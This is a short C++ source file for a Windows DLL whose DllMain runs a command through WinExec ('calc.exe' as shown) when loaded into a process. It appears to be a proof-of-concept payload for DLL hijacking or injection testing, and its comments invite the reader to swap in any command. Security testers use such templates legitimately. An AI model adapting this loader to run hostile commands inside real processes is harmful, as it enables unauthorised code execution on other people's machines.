// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

// This should be built in Visual Studio (create a new DLL project and copy paste this in.
// Modify script as you like. Will return control to the calling process (doesn't kill it).

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    char script[] = "calc.exe";
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        WinExec(script, 1);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
